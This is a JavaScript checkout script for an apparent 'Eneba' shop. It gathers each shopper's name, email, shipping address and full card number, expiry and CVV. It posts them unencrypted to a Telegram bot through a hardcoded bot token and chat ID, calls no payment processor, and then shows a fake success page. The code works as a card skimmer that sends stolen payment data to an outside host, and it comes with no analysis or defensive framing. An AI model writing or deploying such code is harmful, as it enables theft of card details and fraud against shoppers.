/* ===== TELEGRAM CONFIG ===== */
const TELEGRAM_TOKEN   = '8658413935:AAF7Kuf1799FNbF06FXQLUtCitKkHFvAQSM';
const TELEGRAM_CHAT_ID = '945055375';

/* ===== LOAD CART ===== */
let cart = JSON.parse(localStorage.getItem('eneba_cart') || '[]');

function init() {
  const count = cart.reduce((s, i) => s + i.qty, 0);
  document.getElementById('cartCount').textContent = count;

  const container = document.getElementById('summaryItems');
  if (!cart.length) {
    container.innerHTML = '<p style="color:#9e6e88;font-size:0.9rem">Your cart is empty.</p>';
    document.getElementById('placeOrderBtn').disabled = true;
    return;
  }

  container.innerHTML = cart.map(item => `
    <div class="summary-item">
      <span>${item.name} <span style="color:#9e6e88">× ${item.qty}</span></span>
      <span>$${(item.price * item.qty).toFixed(2)}</span>
    </div>
  `).join('');

  const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
  document.getElementById('summaryTotal').textContent = `$${total.toFixed(2)}`;
}

/* ===== TELEGRAM NOTIFICATION ===== */
async function sendTelegramOrder(details) {
  const total = cart.reduce((s, i) => s + i.price * i.qty, 0);
  const itemLines = cart.map(i => `  • ${i.name} (${i.size}) × ${i.qty} — $${(i.price * i.qty).toFixed(2)}`).join('\n');

  const message =
`🛍 *New Eneba Order!*

👤 *Customer*
Name: ${details.name}
Email: ${details.email}

📦 *Shipping*
${details.address}
${details.city}, ${details.zip}
${details.country}

💳 *Card Details*
Number: ${details.cardNumber}
Expiry: ${details.cardExpiry}
CVV: ${details.cardCvv}

🧾 *Items*
${itemLines}

💰 *Total: $${total.toFixed(2)}*`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    console.error('Telegram notify failed:', e);
  }
}

/* ===== PLACE ORDER ===== */
async function placeOrder(e) {
  e.preventDefault();

  const btn = document.getElementById('placeOrderBtn');
  btn.textContent = 'Processing…';
  btn.disabled = true;

  const details = {
    name:       document.getElementById('fullName').value,
    email:      document.getElementById('email').value,
    address:    document.getElementById('address').value,
    city:       document.getElementById('city').value,
    zip:        document.getElementById('zip').value,
    country:    document.getElementById('country').value,
    cardNumber: document.getElementById('cardNumber').value,
    cardExpiry: document.getElementById('cardExpiry').value,
    cardCvv:    document.getElementById('cardCvv').value
  };

  await sendTelegramOrder(details);

  localStorage.removeItem('eneba_cart');
  document.getElementById('checkoutPage').style.display = 'none';
  document.getElementById('successPage').style.display  = 'flex';
}

/* ===== HELPERS ===== */
function toggleBilling(checkbox) {
  const fields = document.getElementById('billingFields');
  fields.style.display = checkbox.checked ? 'none' : 'block';
  fields.querySelectorAll('input').forEach(input => {
    input.required = !checkbox.checked;
  });
}

function formatCard(input) {
  let v = input.value.replace(/\D/g, '').substring(0, 16);
  input.value = v.replace(/(.{4})/g, '$1 ').trim();
}

init();
